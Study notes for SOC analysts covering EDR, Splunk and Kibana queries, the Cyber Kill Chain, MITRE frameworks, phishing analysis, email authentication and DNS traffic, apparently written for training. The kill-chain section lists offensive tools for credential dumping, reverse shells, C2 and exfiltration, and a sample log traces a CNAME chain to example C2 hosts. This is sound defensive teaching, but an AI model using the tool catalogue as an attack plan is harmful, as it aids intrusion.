
# Endpoint Detection and Response (EDR)


Endpoint Detection and Response (EDR) is a security solution designed to monitor, detect, and respond to advanced threats at the endpoint level. As a SOC analyst, it is essential for you to understand how the EDR works since it is a widely adopted solution in organizations to protect their endpoints. One limitation is EDR is a host-only security solution and does not detect network-level threats.


## **Features of EDR**


There are three main features of an EDR, which can also be referred to as the three pillars of an EDR solution.


### **Visibility** 


It collects detailed data from the endpoints, which includes process modifications, registry modifications, file and folder modifications, user actions, and much more. It then presents this information in a very structured format to the analyst. The analyst can see the whole process tree with a complete activity timeline of the sequence of actions. The analyst can also access the historical data of any endpoint for threat hunting or any other purpose. 


The following screenshot shows graphical representation of a process tree. We can see which processes were spawned on the endpoint. Each node represents a process. The lines connecting them represents their relationship. If we click on the `+` icon given with each process, we will be able to see all the network connections, registry changes, file changes etc. associated with that process. 


![Image](images/000ffd21002635c8cfcdf72f997ea2fe.png)


### **Detection**


It incorporates signature-based detections as well as behavior-based detections, such as unexpected user activities. With modern machine learning capabilities, it identifies any deviation from the baseline behavior and instantly flags it. It can also detect fileless malware that resides in memory. It also allows us to feed custom IOCs for threat detections.


The following screenshot shows a dashboard of all the detections happening on the different endpoints. Each detection is represented by a row with different fields including the severity of the detection, time, triggering file, hostname, username, and more. The Tactic via Technique field maps the detection with MITRE. Any detection when clicked will show us rich details which helps a SOC analyst during the analysis.


![Image](images/1efe80fded2bd65633b4a632e0c67d9e.png)


### **Response**


EDR also empowers analysts to take action on detected threats. These actions can be taken at any endpoint within the central EDR console. Imagine getting a detection on the EDR with full-fledged details on when, where, and what happened, and you have to opt for the best possible action for that detection. As an analyst, you may decide to isolate a complete endpoint, terminate a process, or quarantine some files. You can also connect to the host remotely and execute actions independently. You can do this all from within the EDR console.


The following screenshot shows the actions available that can be taken on the host after connecting to it.


![Image](images/fabb35a890c62a878d6252ada0d175a2.png)


Inside an EDR, response actions focus on four immediate steps:
• **Isolate**: Cut the device off from the network to stop the attack from spreading.
• **Kill**: Instantly terminate malicious processes and freeze compromised user accounts.
• **Clean**: Delete or quarantine malware files and undo unauthorized registry changes.
• **Investigate**: Remotely pull memory dumps, logs, and files to analyze the breach.


## **EDR Agents**


We can integrate multiple endpoints with our EDR and manage them through a centralized console. There are EDR agents that we have to deploy inside those endpoints. These agents are also sometimes referred to as sensors. They are the eyes and ears of the EDR. Their job is to sit at the endpoint and monitor all the activities. The information about these activities is sent in detail to the EDR central console in real time. The EDR agents can do some basic signature-based and behavior-based detections by themselves and send them to the EDR console, which triggers alerts.


## **EDR Console**


All the detailed data sent by the EDR agents is correlated and analyzed through complex logic and machine learning algorithms. The threat intelligence information is matched with the collected data. The EDR is just like the brain connecting all the dots. These dots connect to form a detection, often called an alert.


The following screenshot shows the dashboard of an EDR console. All the data from the endpoint agents is coming into this console, and the detections are happening here. This dashboard gives a holistic view of the current status of detections in all the endpoints.


![Image](images/c6deb4c7a9f2a10a6f9e5cb4205a1d8c.png)


## **What is Telemetry?**


Telemetry are the activities which is captured by EDR agents from their endpoints, which is collected and push it to the EDR console. Telemetry is the black box of an endpoint with everything necessary for detection and investigation.


Usually, many activities are going on in the endpoints, most of which are legitimate. It is often difficult to differentiate between regular and malicious activity. The more data is collected, the better judgments can be made. EDR collects detailed telemetry from the endpoints. It uses complex logic and machine learning algorithms to assess the activities. Advanced threats keep most of their activities stealthy, using legitimate utilities during execution. Individually, their activities may seem harmless, but when observed through detailed telemetry, they tell a different story. This detailed telemetry not only helps the EDR detect advanced threats and make better judgments on the legitimacy of the activities, but it is also very helpful for the analysts during the investigations. The analysts can understand the full chain of events, identify the root cause, and reconstruct the attack timeline.


# SIEM


→ A unique Event ID **104** is logged every time a user tries to remove or clear event logs. 


## Splunk


Splunk is one of the leading SIEM solutions in the market. It allows users to collect, analyze, and correlate network and machine logs in real time.


Splunk has three main components: Forwarder, Indexer, and Search Head. These components work together to help us search and analyze the data. These components are explained below:


## Splunk Forwarder


Splunk Forwarder is a lightweight agent installed on the endpoint intended to be monitored, and its main task is to collect the data and send it to the Splunk instance.


The forwarder collects the data from the log sources and sends it to the Splunk Indexer. 


## Splunk Indexer


Splunk Indexer plays the main role in processing the data it receives from forwarders. It parses and normalizes the data into field-value pairs, categorizes it, and stores the results as events, making the processed data easy to search and analyze.


Now, the data, which is normalized and stored by the indexer, can be searched by the Search Head, as explained below.


## Search Head


Splunk Search Head is the place within the **Search & Reporting App** where users can search the indexed logs, as shown below. The searches are done using the **SPL** (Search Processing Language), a powerful query language for searching indexed data. When the user performs a search, the request is sent to the indexer, and the relevant events are returned as field-value pairs.


![Image](images/f01f09e7bdcd5c4f7383a768d7cb3aab.png)


The Search Head also allows you to transform results into presentable tables and visualizations such as pie, bar, and column charts, as shown below:


![Image](images/19f7bf39773e7b8aa7387119f4368261.png)


## Practical Demo with a json VPN Log file


The downloaded `VPN_logs` file is newline-delimited JSON. Use the Splunk upload wizard so Splunk treats each line as one event.

1. Open **Add Data** and choose **Upload**.
2. Select the downloaded `VPN_logs` file.
3. Keep the JSON source type detected by .

    Splunk

4. On **Input Settings**, create or select the index `VPN_Logs`.
5. After the upload completes, open **Search & Reporting** and set the time picker to **All time**.

If the field names do not appear in search results, add `| spath` after the base search. That tells Splunk to parse the JSON fields from each event.


## **Useful checks**


Use these searches to check your import before answering the questions:


```plain text
index=VPN_Logs
| stats count
```


```plain text
index=VPN_Logs
| spath
| search UserName="Maleena"
| stats count
```


```plain text
index=VPN_Logs
| spath
| search Source_ip="107.14.182.38"
| stats values(UserName) as UserName count
```


```plain text
index=VPN_Logs
| spath
| search Source_Country!="France"
| stats count
```


```plain text
index=VPN_Logs
| spath
| search Source_ip="107.3.206.58"
| stats count
```


# **Elastic Stack**


Elastic Stack (ELK) was originally developed to store, search, and visualize large amounts of data. Organizations used it to monitor application performance and perform searches on large datasets. Over time, its features made it popular in security operations as well. Now, many SOC teams use ELK almost as a SIEM solution. 


### Core components


![Image](images/e89be8fb32baaa04fdee0b4c863bb5aa.png)


## **How they work together:**


Now that we have learned about all the components of the Elastic Stack, let's see how these components work together step-by-step:

- **Beats** collect data from multiple agents. For example, Winlogbeat collects Windows event logs, and Packetbeat collects network traffic flows.
- **Logstash** collects data from beats, ports, or files, parses/normalizes it into field value pairs, and stores them into .

    Elasticsearch

- **Elasticsearch** acts as a database used to search and analyze data but only json formatted data.
- **Kibana** is responsible for displaying and visualizing the data stored in . The data stored in  can easily be shaped into different visualizations, time charts, infographics, etc., using .

![Image](images/ce45d34779be3012ab1850920a397f33.png)


KQL **(Kibana Query Language)** is a search query language used to search the ingested logs/documents in Elasticsearch. 


### Types of Search

1. **Free Text Search**
    - Searches across **all fields**.
    - Example:
        - `security` → Finds all logs containing **security**.
        - `"United States"` → Finds exact phrase.
        - `United` → No result (matches whole words only).
        - `United*` → Wildcard () matches words starting with **United** (e.g., _United States_, _United Nations_).
2. **Field-Based Search**
    - Searches a **specific field**.
    - Syntax:

        ```plain text
        Field:Value
        ```

    - Example:

        ```plain text
        Source_ip:238.163.231.224 AND UserName:Suleman
        ```


### Logical Operators

- **AND** → Both conditions must match.

    ```plain text
    "United States" AND "Virginia"
    ```

- **OR** → Either condition can match.

    ```plain text
    "United States" OR "England"
    ```

- **NOT** → Excludes a term.

    ```plain text
    "United States" AND NOT ("Florida")
    ```


### Key Points

- Free text searches **all fields**.
- Field search uses **`Field:Value`** syntax.
- = wildcard for partial word matching.
- Common operators: **AND, OR, NOT**.
- Clicking the search bar shows available fields.

## SOAR


Security Orchestration, Automation, and Response (SOAR) is a tool that unifies all the security tools used in a SOC. With SOAR, SOC analysts do not need to switch between SIEM, EDR, Firewall, and other security tools for their investigations. They can operate all these tools within a single SOAR interface. Along with unifying the security tools, it also provides ticketing and case management features to the analysts, through which they can document, track, and resolve their incidents in a structured way.


![Image](images/4033168f6c9a24d5e814e93210898437.png)


It connects different tools from various vendors within the unified SOAR interface. It defines workflows for investigating various types of alerts, known as **Playbooks**. These playbooks are predefined steps that tell the SOAR how to investigate an alert.


# **Pyramid of Pain** 


![Image](images/621bf724a2a27624c759907d50697669.png)


The **Pyramid of Pain** is **a conceptual model that ranks indicators of compromise (IOCs) from easy to hard for attackers to change: Hash Values, IP Addresses, and Domain Names**


### The Six Levels of the Pyramid

1. **Hash Values (Trivial):** File signatures like MD5 or SHA-1; attackers change them instantly by tweaking a single bit of code.
2. **IP Addresses (Easy):** Network locations that hackers rotate quickly using new servers or proxies.
3. **Domain Names (Simple):** Web addresses used for command and control; slightly harder to register, but easy to regenerate.
4. **Host and Network Artifacts (Annoying):** Registry keys, file paths, or specific traffic patterns; blocking these forces code changes.
5. **Tools (Challenging):** Software used in attacks (like remote access tools); replacing them requires new testing and development.
6. **Tactics, Techniques, and Procedures / TTPs (Tough):** The actual behaviors and methodology of the adversary; habits are very hard for attackers to alter.

For detection rules [SOC Prime Threat Detection Marketplace](https://tdm.socprime.com/)[ ](https://tdm.socprime.com/)is a great platform, where security professionals share their detection rules for different kinds of threats including the latest CVE's that are being exploited in the wild by adversaries. 


Fuzzy hashing helps you to perform similarity analysis - match two files with minor differences based on the fuzzy hash values. One of the examples of fuzzy hashing is the usage of [SSDeep](https://ssdeep-project.github.io/ssdeep/index.html)


# Cyber Kill Chain


The Cyber Kill Chain is **a seven-step framework designed  to track and stop a cyberattack at every stage of its lifecycle**.


## 1. Reconnaissance


### Attacker Action


The attacker gathers publicly available information about the target, including employee names, email addresses, domains, IP addresses, technologies in use, and exposed services.


### Common Tools

- **theHarvester** – Collects emails, subdomains, IPs, and hostnames from public sources.
- **Hunter.io** – Finds employee email addresses associated with a domain.
- **OSINT Framework** – Directory of OSINT tools for reconnaissance.
- **Shodan** – Searches for internet-facing devices and services.
- **Maltego** – Maps relationships between people, organizations, domains, and infrastructure.
- **Nmap** – Scans hosts, ports, and running services.

### EDR Response

- Limited visibility because reconnaissance occurs outside the endpoint.
- May detect local enumeration commands or suspicious account discovery if the attacker already has access.

---


## 2. Weaponization


### Attacker Action


The attacker creates a malicious payload by combining malware with an exploit or embedding it inside a document or executable.


### Common Tools

- **Metasploit Framework** – Generates exploits and payloads.
- **msfvenom** – Creates custom payloads.
- **Veil Framework** – Generates AV-evasive payloads.
- **Shellter** – Injects payloads into legitimate executables.
- **Donut** – Converts executables into shellcode for in-memory execution.

### EDR Response

- No direct visibility because this stage occurs on the attacker's machine.
- Can later identify known payloads using signatures, hashes, or behavioral analysis.

---


## 3. Delivery


### Attacker Action


The attacker delivers the malicious payload through phishing emails, malicious websites, USB devices, or downloads.


### Common Tools

- **GoPhish** – Phishing campaign framework.
- **Social-Engineer Toolkit (SET)** – Creates phishing pages and payload delivery attacks.
- **Evilginx2** – Credential phishing and session hijacking.
- **King Phisher** – Phishing simulation framework.
- **USB Rubber Ducky** – Delivers malicious keystrokes via USB.

### EDR Response

- Monitors downloaded files and email attachments.
- Detects malicious scripts and executables.
- Quarantines suspicious files before execution.

---


## 4. Exploitation


### Attacker Action


The attacker exploits vulnerabilities or tricks the user into executing malicious code.


### Common Tools

- **Metasploit Framework** – Exploits software vulnerabilities.
- **Cobalt Strike Beacon** – Executes post-exploitation payloads.
- **PowerShell Empire** – Executes PowerShell-based attacks.
- **Mimikatz** _(often after exploitation)_ – Extracts credentials from memory.
- **ExploitDB** – Repository of public exploits.

### EDR Response

- Detects exploit behavior such as:
    - Memory injection
    - Privilege escalation
    - PowerShell abuse
    - Process hollowing
    - DLL injection
- Terminates malicious processes and raises alerts.

---


## 5. Installation


### Attacker Action


The attacker installs malware and establishes persistence to survive system reboots. Attacker can use  [Timestomping](https://attack.mitre.org/techniques/T1070/006/) technique that lets an attacker modify the file's timestamps, including to modify, access, create and change times.


### Common Tools

- **Cobalt Strike**
- Installing a **web shell (malicious script)** on the webserver
- use [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-backdoor/) to install a backdoor on the victim's machine
- Creating or modifying Windows services using ssc.exe
- **Sliver C2**
- **Empire**
- **Netcat (nc)** – Creates reverse shells.
- **schtasks** – Creates scheduled tasks for persistence.
- **reg.exe** – Adds malicious registry Run keys.
- **PsExec** – Used to deploy malware remotely.

### EDR Response

- Detects new services, scheduled tasks, registry changes, startup modifications, and unauthorized binaries.
- Removes persistence mechanisms and quarantines malware.

---


## 6. Command and Control (C2)


### Attacker Action


The compromised system connects to the attacker's server to receive commands and exfiltrate data.


### Common Tools

- **Cobalt Strike Team Server**
- **Sliver C2**
- **Mythic C2**
- **Havoc C2**
- **Empire**
- **Netcat**
- **DNSCat2** – DNS tunneling.
- **Chisel** – TCP/HTTP tunneling.

### EDR Response

- Detects:
    - Beaconing behavior
    - Suspicious outbound connections
    - DNS tunneling
    - Long-lived encrypted sessions
- Isolates the endpoint and terminates the C2 process.

---


## 7. Actions on Objectives


### Attacker Action


The attacker performs the final objective, such as stealing credentials, encrypting files, moving laterally, or exfiltrating sensitive data.


### Common Tools

- **Mimikatz** – Credential dumping.
- **Rclone** – Data exfiltration to cloud storage.
- **PsExec** – Lateral movement.
- **Impacket** – SMB, WMI, and Kerberos attacks.
- **BloodHound** – Maps Active Directory attack paths.
- **SharpHound** – Collects AD data for BloodHound.
- **AnyDesk/TeamViewer** – Misused for remote access.
- **WinRAR/7-Zip** – Archives stolen data before exfiltration.

### EDR Response

- Detects:
    - LSASS credential dumping
    - Mass file encryption (ransomware)
    - Suspicious use of administrative tools
    - Lateral movement techniques
    - Large-scale file access or exfiltration
- Kills malicious processes, isolates the endpoint, blocks further activity, and provides forensic evidence for incident response.

# Unified Kill Chain


The **Unified Kill Chain (UKC)** extends the traditional 7-stage Cyber Kill Chain into **18 phases**, providing a much more detailed view of how modern attackers operate. It also aligns closely with the **MITRE ATT&CK** framework, making it particularly useful for SOC analysts, threat hunters, and incident responders.


![Image](images/208e3263cf39d8d993eec0d6f578e6ba.png)


# **MITRE ATT&CK Framework**


The [MITRE ATT&CK](https://attack.mitre.org/) framework is "a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. The ATT&CK knowledge base is used as a foundation for the development of specific threat models and methodologies in the private sector, in government, and in the cyber security product and service community".


In 2013, MITRE recognized the need to document and categorize the standard tactics, techniques, and procedures (TTPs) used by advanced persistent threat (APT) groups. To better understand how adversaries operate, it's helpful to break down what each part of TTP represents:

- [Tactic](https://attack.mitre.org/tactics/enterprise/): An adversary's goal or objective. The “why” of an attack.
- [Technique](https://attack.mitre.org/techniques/enterprise/): How an adversary achieves their goal or objective.
- Procedure: The implementation or how the technique is executed.

## **ATT&CK Matrix**


The [MITRE ATT&CK Matrix](https://attack.mitre.org/matrices/) is a powerful visual representation of all tactics and techniques that exist within the framework. You can also utilize the [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/), a handy tool for annotating and exploring matrices. The tactics are represented across the top of the matrix. Each tactic contains techniques nested below, which can be expanded to reveal sub-techniques.


Let's check it out.

1. **Tactic**: Let's say that an attacker wants to perform Reconnaissance on their target. This is the attacker's goal.
2. **Technique**: They may utilize the Active Scanning technique. This is how they achieve their Reconnaissance goal.
3. **Sub-technique**: Active Scanning comprises three specific methods: Scanning IP Blocks, Vulnerability Scanning, or Wordlist Scanning.

## MITRE Cyber Analytics Repository (CAR)


The **Cyber Analytics Repository (CAR)** is a **MITRE knowledge base of detection analytics** built around the **MITRE ATT&CK framework**. Instead of describing how attackers operate, CAR explains **how defenders can detect those attacker behaviors**.


In simple terms:

- **ATT&CK** = _What attackers do (TTPs)._
- **CAR** = _How to detect those TTPs._

---


---


![Image](images/75fd66e3941ae7e7fccdddbe2244f3b6.png)


# What Does Each CAR Analytic Contain?


Each CAR analytic typically includes:


### 1. Description


Explains the attacker behavior being detected.


### 2. ATT&CK Mapping


Links the analytic to the relevant ATT&CK:

- Tactic
- Technique
- Sub-technique (if applicable)

### 3. Detection Logic


Describes what events or behaviors should trigger an alert.


### 4. Implementations


Provides example detection rules in different formats such as:

- **Pseudocode**
- **Splunk SPL**
- **Elastic EQL**
- **LogPoint**
- Other SIEM-specific queries (depending on the analytic)

### 5. Data Sources


Lists the required logs or telemetry needed for detection, such as:

- Process creation
- File access
- Registry modifications
- Windows Event Logs
- Network connections

### 6. Unit Tests _(available for some analytics)_


Provides sample test cases to verify that the detection rule works correctly.


## **MITRE D3FEND**


**D3FEND** (Detection, Denial, and Disruption Framework Empowering Network Defense) is a structured framework that maps out defensive techniques and establishes a common language for describing how security controls work. D3FEND comes with its own [matrix(opens in new tab)](https://d3fend.mitre.org/), which is broken down into seven tactics, each with its associated techniques and IDs.


![Image](images/6ec24e082bf5c75edf833189987981bb.png)


For example, the [Credential Rotation D3-CRO](https://d3fend.mitre.org/technique/d3f:CredentialRotation/) technique emphasizes the regular rotation of passwords to prevent attackers from reusing stolen credentials. D3FEND explains how this defense works, what to consider when implementing it, and how it relates to specific digital artifacts and ATT&CK techniques, helping you see both perspectives: the attacker’s move and the defender’s countermeasure.


## **MITRE Adversary Emulation Library**


MITRE's [Adversary Emulation Library](https://ctid.mitre.org/resources/adversary-emulation-library/), primarily maintained and contributed to by The Center for Threat Informed Defense ([CTID](https://ctid.mitre.org/)), is a free resource of adversary emulation plans. The [library](https://github.com/center-for-threat-informed-defense/adversary_emulation_library) currently contains several emulations that mimic real-world attacks by known threat groups. The emulation plans are a step-by-step guide on how to mimic the specific threat group.


## **Caldera**


[Caldera](https://caldera.mitre.org/) is an automated adversary emulation tool designed to help security teams test and enhance their defenses. It provides the ability to simulate real-world attacker behavior utilizing the ATT&CK framework. This allows defenders to evaluate detection methods and practice incident response in a controlled environment. Caldera supports offensive and defensive operations, making it a powerful tool for red and blue team exercises.


# **Phishing Analysis Tools**


Most info can be extracted from source but additional tools can be utilized. 


## **Email Header Analysis**


### **Mail Header Analysis**

- [Messageheader](https://toolbox.googleapps.com/apps/messageheader/analyzeheader), part of the Google Admin Toolbox, helps analyze email headers.
- [Message Header Analyzer](https://mha.azurewebsites.net/), can perform the same type of analysis

### **IP and URL Reputation Analysis**

- [IPinfo](https://ipinfo.io/) is a simple and effective tool for gathering information about an IP address
- [URLScan.io](https://urlscan.io/) is a tool that enables analysts to safely investigate websites without visiting them directly.
- Talos [IP & Domain Reputation Center](https://talosintelligence.com/reputation_center/) is a threat intelligence tool from Cisco that enables analysts to assess the reputation of IP addresses, domains, and networks.

## **Email Body Analysis**


### **Mail Body Analysis**

- Right click + copy link address
- Another effective way to identify URLs in an email is to use a [URL extraction too](https://www.convertcsv.com/url-extractor.htm)l
- Tools like [CyberChef](https://gchq.github.io/CyberChef/#recipe=Extract_URLs(false,false,false)) can also perform this function, making them a versatile option for email analysis.

## Email Attachments Analysis

- **Never open or execute** suspicious email attachments on your local machine.
- Download attachments **only in a controlled environment** (Sandbox, Virtual Machine, or Lab Machine).

Generate SHA-256 Hash


```plain text
sha256sum <filename>
```


Analyze the Hash


Check the generated SHA-256 hash on threat intelligence platforms:

- **Cisco Talos Reputation Center**
- **VirusTotal**

## Malware Sandboxes

- A controlled environment used to safely execute and analyze suspicious files or URLs without affecting the host system.
- Helps identify:
    - Malware behavior
    - Network activity
    - Downloaded payloads
    - Indicators of Compromise (IOCs)

### ANY.RUN

- Interactive malware sandbox.
- Supports real-time analysis of files and URLs.
- Allows monitoring of processes, network activity, and system changes.

### Hybrid Analysis

- Free malware analysis sandbox.
- Provides detailed reports on:
    - File behavior
    - System changes
    - Network activity
    - IOCs

### JOESandbox

- Advanced malware analysis sandbox.
- Performs **static** and **dynamic** analysis.
- Generates reports with behavior, IOCs, and threat classification

---


## **PhishTool**

- A powerful platform that automates and streamlines phishing email investigations.
- **Target users:** SOC analysts, threat intelligence analysts, and security researchers.
- **Core function:** Combines threat intelligence, OSINT, email metadata, and automated analysis to extract Indicators of Compromise (IOCs) and identify malicious intent.

**Key Features & Workflow:**

- **Identifying Artifacts:**
    - Upload an email to view key artifacts instantly.
    - Provides three viewing modes: **Rendered HTML** (inbox view), **Raw HTML**, and **Message Source**.
- **Further Analysis (via navigation tabs):**
    - Analyze authentication results, transmission paths, and embedded URLs.
    - Review and analyze email attachments directly in the platform.
- **VirusTotal Integration:**
    - Check reputation and detection results seamlessly without leaving PhishTool.
- **Resolving the Case:**
    - Document findings (mimics a real SOC environment).
    - Mark emails as malicious.
    - Flag key artifacts (e.g., sender addresses, originating IPs, embedded URLs).
    - Add investigation notes and click **Resolve** to close the case.

# PHISHING PREVENTION


## Sender Policy Framework (SPF)


**SPF (Sender Policy Framework)** is an email authentication method that verifies whether the **mail server sending an email is authorized** to send emails for a particular domain. It helps prevent **email spoofing** and **phishing**.


---


### How SPF Prevents Phishing


Suppose the real company is **Amazon**.


Amazon's SPF record says:

> **Only Amazon's mail servers are allowed to send emails using @amazon.com.**

A hacker tries to send:


```plain text
From: support@amazon.com
```


using **their own mail server**.


The recipient's mail server checks Amazon's SPF record:

- ❌ Hacker's mail server is **not authorized**
- ⚠️ Email is **flagged as suspicious** or **rejected**

### SPF Workflow


```plain text
Sender
   │
   ▼
Email Sent
   │
   ▼
Recipient Mail Server
   │
Checks SPF Record (through DNS)
   │
   ├── Authorized → Accept
   ├── SoftFail → Flag as Suspicious
   └── Not Authorized → Reject
```


---


### SPF Verification Results


| Result              | Action             |
| ------------------- | ------------------ |
| Pass, Neutral, None | Accept             |
| SoftFail, PermError | Flag as Suspicious |
| Fail, TempError     | Reject             |


---


### Example SPF Record


```plain text
v=spf1 ip4:127.0.0.1 include:_spf.google.com -all
```


**Meaning:**

- **v=spf1** → SPF version
- **ip4:127.0.0.1** → Authorized IPv4 address
- **include:_spf.google.com** → Allow Google's mail servers
- **all** → Reject all other mail servers

---


---


### Useful Tools

- **SPF Surveyor (dmarcian)** – View and validate SPF records.
- **Google Admin Toolbox Messageheader** – Analyze email headers and view SPF results.

## DomainKeys Identified Mail (DKIM)


### What is DKIM?


**DKIM (DomainKeys Identified Mail)** is an email authentication method that uses **digital signatures** to verify that an email **was sent by the claimed domain** and **has not been modified during transit**.


Unlike **SPF**, **DKIM survives email forwarding**, making it more reliable.


---


## Simple Scenario


Suppose **Amazon** sends you an email.


Before sending the email:

- Amazon's mail server signs the email using a **Private Key**.
- The email contains this **digital signature**.

When your mail server receives it:

- It retrieves Amazon's **Public Key** from the DNS **DKIM record**.
- It compares the signature with the public key.
- ✅ Signature matches → Email is authentic.
- ❌ Signature doesn't match → Flag or Reject the email.

---


## DKIM Workflow


```plain text
Amazon Mail Server
      │
Signs Email with Private Key
      │
      ▼
Email Sent
      │
      ▼
Recipient Mail Server
      │
Gets Public Key from DNS
      │
Verifies Digital Signature
      │
      ├── Match → Accept
      └── No Match → Flag / Reject
```


---


## Example DKIM Record


```plain text
v=DKIM1; k=rsa; p=<public_key>
```


**Meaning:**

- **v=DKIM1** → DKIM version
- **k=rsa** → Encryption algorithm (RSA)
- **p=** → Public key used to verify the email signature
> **Note:** DKIM records may contain additional tags depending on the email provider.

---


## DKIM Verification Failure (PermError)


![Image](images/dad57b02da2523618b26446a80077297.png)


A **PermError (Permanent Error)** means DKIM verification failed due to issues such as:

- Invalid digital signature
- Missing or incorrect DKIM DNS record
- Email modified during transit
- DKIM misconfiguration

---


### Useful Tools

- **dmarcian DKIM Record Checker**
- **dmarcian DKIM Validator**

---


## Domain-based Message Authentication, Reporting & Conformance (DMARC)


### What is DMARC?


**DMARC (Domain-based Message Authentication, Reporting & Conformance)** is an email authentication protocol that **combines SPF and DKIM** to verify that an email is legitimate. It also tells the receiving mail server **what to do if authentication fails**.


---


## Simple Scenario


Suppose **Amazon** sends you an email.


When your mail server receives it:

1. It checks **SPF** → Is the sending mail server authorized?
2. It checks **DKIM** → Is the email digitally signed and unmodified?
3. It checks whether the **sender's domain matches (alignment)** with the SPF/DKIM results.
- ✅ SPF/DKIM pass and domains align → Accept the email.
- ❌ Alignment fails → Follow the DMARC policy (Reject, Quarantine, or None).

---


## DMARC Workflow


```plain text
Email Received
      │
      ▼
Check SPF
      │
Check DKIM
      │
Verify Domain Alignment
      │
      ├── Pass → Accept
      └── Fail → Apply DMARC Policy
                  │
                  ├── None → Deliver
                  ├── Quarantine → Spam Folder
                  └── Reject → Reject Email
```


---


## Example DMARC Record


```plain text
v=DMARC1; p=quarantine; rua=mailto:postmaster@website.com
```


**Meaning:**

- **v=DMARC1** → DMARC version
- **p=quarantine** → Move failed emails to the spam folder
- **rua=mailto:postmaster@website.com** → Send aggregate reports to this email

---


## DMARC Policies


| Policy         | Action                         |
| -------------- | ------------------------------ |
| **none**       | Monitor only (no action)       |
| **quarantine** | Move email to Spam/Junk folder |
| **reject**     | Reject the email               |


---


## Secure/Multipurpose Internet Mail Extensions (S/MIME)


### What is S/MIME?


**S/MIME (Secure/Multipurpose Internet Mail Extensions)** is an email security standard that uses **public key cryptography** to provide **digital signatures** and **encryption**.

- **Private Key** → Kept secret by the owner.
- **Public Key** → Shared openly with others.

---


## 1. Digital Signature


The sender **signs the email with their private key**.


The recipient **verifies the signature using the sender's public key**.


### Provides:

- **Authentication** → Confirms the sender's identity.
- **Non-repudiation** → Sender cannot deny sending the email.
- **Data Integrity** → Detects if the email was modified.

---


## 2. Encryption


The sender **encrypts the email using the recipient's public key**.


Only the recipient can **decrypt it using their private key**.


### Provides:

- **Confidentiality** → Only the intended recipient can read the email.

---


## Simple Scenario


Suppose **Bob** wants to send a secure email to **Mary**.


### Sending

1. Bob signs the email using **Bob's Private Key**.
2. Bob encrypts the email using **Mary's Public Key**.
3. Bob sends the email.

### Receiving

1. Mary verifies Bob's signature using **Bob's Public Key**.
2. Mary decrypts the email using **Mary's Private Key**.

---


# Network Traffic Analysis 


### Private IP Addresses


Private IP addresses are reserved for **internal (local) networks**. They are **not routable on the public Internet**, meaning they can only be used within a private network (home, office, school, etc.).


---


### Three Private IP Ranges


| Class       | IP Range                        | Common Usage                             |
| ----------- | ------------------------------- | ---------------------------------------- |
| **Class A** | `10.0.0.0 – 10.255.255.255`     | Large corporate networks                 |
| **Class B** | `172.16.0.0 – 172.31.255.255`   | Medium businesses, universities, schools |
| **Class C** | `192.168.0.0 – 192.168.255.255` | Home networks, small offices             |


## Common DNS Query Types (QTYPE)


| Query Type | Purpose                                                                                                                                                               | Example                                                   |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------- |
| **A**      | Returns the **IPv4 address** of a domain.                                                                                                                             | `google.com → 142.250.x.x`                                |
| **AAAA**   | Returns the **IPv6 address** of a domain.                                                                                                                             | `google.com → 2607:f8b0::`                                |
| **CNAME**  | Maps an **alias (nickname)** to a **canonical (true master) domain name**. Often abused by malware to hide the final attacker server behind an innocent-looking name. | `weatherapp-free.top → ://malicious-tld.com`              |
| **MX**     | Returns the **mail server** responsible for receiving emails.                                                                                                         | `gmail.com → alt1.gmail-smtp-in.l.google.com`             |
| **NS**     | Returns the **authoritative name servers** for a domain.                                                                                                              | `ns1.example.com`                                         |
| **TXT**    | Returns **text information** (SPF, DKIM, verification records). Malware may abuse TXT records to hide commands.                                                       | `v=spf1 include:_spf.google.com -all`                     |
| **PTR**    | Performs a **reverse DNS lookup** (IP → Domain Name).                                                                                                                 | `8.8.8.8 → dns.google`                                    |
| **SOA**    | Returns the **Start of Authority** record containing DNS zone information.                                                                                            | Primary DNS server, serial number, refresh interval, etc. |
| **SRV**    | Returns the **location of specific services** (host and port).                                                                                                        | Used by SIP, Active Directory, Microsoft services.        |
| **CAA**    | Specifies which **Certificate Authorities (CAs)** are allowed to issue SSL/TLS certificates for a domain.                                                             | `letsencrypt.org`                                         |


### Exam Tip

- **A** = Domain → IPv4
- **AAAA** = Domain → IPv6
- **PTR** = IP → Domain (Reverse DNS)
- **MX** = Mail Server
- **TXT** = Text Records (SPF/DKIM/DMARC, verification, malware C2)
- **CNAME** = Alias
- **NS** = Name Server
- **SOA** = DNS Zone Information
- **SRV** = Service Location
- **CAA** = Authorized Certificate Authority

## CNAME Exploitation Attack Trail


###  Live Traffic Log


```markdown
SRC_IP         QUERY                                QTYPE    RESPONSE_DATA
192.168.1.16   update.weatherapp-free.top           CNAME    c2-server.malicious-tld.com
192.168.1.16   c2-server.malicious-tld.com          CNAME    hidden-panel.botnet-infrastructure.net
192.168.1.16   hidden-panel.botnet-infrastructure.net  A       198.51.100.42
```


### Step-by-Step Breakdown


**Step 1 (Innocent Mask):**
Local host **192.168.1.16** requests **update.weatherapp-free.top**.
DNS responds with a **CNAME** pointing to [**c2-server.malicious-tld.com**](http://c2-server.malicious-tld.com/).


**Step 2 (The Redirection):**
The host follows the trail and queries the new hostname.
DNS responds with another **CNAME** pointing to [**hidden-panel.botnet-infrastructure.net**](http://hidden-panel.botnet-infrastructure.net/).


**Step 3 (True IP Resolution):**
The host sends a final **QTYPE=A** request for [**hidden-panel.botnet-infrastructure.net**](http://hidden-panel.botnet-infrastructure.net/).
DNS returns the destination IP **198.51.100.42**.


**Step 4 (Payload Delivery):**
The infected local host directly establishes a malicious connection to **198.51.100.42**.


## DNS Request vs HTTP Request


Every time you visit a website, your computer performs these two actions:


```plain text
[ Your Device ] ──(1. DNS Request: "Where is shop.com?")────────► [ DNS Server ]
[ Your Device ] ◄─(2. DNS Response: "It is at 1.2.3.4")───────── [ DNS Server ]

[ Your Device ] ──(3. HTTP Request: "Show me the homepage")─────► [ Web Server (1.2.3.4) ]
[ Your Device ] ◄─(4. HTTP Response: Website Files)───────────── [ Web Server (1.2.3.4) ]
```


| Feature             | DNS Request                                  | HTTP Request                                             |
| ------------------- | -------------------------------------------- | -------------------------------------------------------- |
| **Purpose**         | Translates a domain name into an IP address. | Requests web content (HTML, images, videos, APIs, etc.). |
| **Protocol / Port** | UDP/TCP Port **53**                          | TCP Port **80 (HTTP)** / **443 (HTTPS)**                 |
